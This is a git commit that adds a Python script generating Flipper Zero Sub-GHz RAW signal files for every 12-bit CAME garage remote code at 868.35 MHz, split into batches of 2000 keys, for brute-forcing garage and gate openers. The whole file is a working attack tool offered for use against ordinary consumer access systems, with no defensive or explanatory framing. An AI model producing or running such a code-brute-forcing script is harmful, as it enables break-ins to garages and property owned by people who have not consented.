86a3155a815cdbe385d6aba65e4de223545f66a9
BitcoinRaven <68755455+BitcoinRaven@users.noreply.github.com>
2022-08-09 11:48:04 +0300

    868.35Mhz support added
    868.35Mhz support added

---
+++ Sub-GHz/Garages/CAME_brute_force/12Bit/868.35Mhz/CAMEbruteforcer868.py
@@ -0,0 +1,35 @@
+# Script settings:
+split = 2000  # number of keys per file
+file_header = """
+Filetype: Flipper SubGhz RAW File
+Version: 1
+Frequency:  868350000
+Preset: FuriHalSubGhzPresetOok650Async
+Protocol: RAW
+"""
+
+# Protocol settings: https://phreakerclub.com/447
+n_bits = 12
+combos = range(0, pow(2, n_bits))
+repetition = 3
+transposition_table = {
+    "0": "-320 640 ",
+    "1": "-640 320 ",
+}
+pilot_period = "-11520 320 "
+
+for key_dec in combos:
+    key_bin = f"{key_dec:012b}"  # format as 12 digits bin
+    key_str = pilot_period
+    for bit in key_bin:
+        key_str += transposition_table[bit]
+    joined = "".join(key_str)
+    key_str = key_str * repetition
+
+    if (key_dec % split) == 0:
+        filename = f"CAME_{split}_{int(key_dec / split)}.sub"
+        with open(filename, "w") as f:
+            f.write(file_header)
+
+    with open(filename, "a") as f:
+        f.write("RAW_Data: " + key_str + "\n")
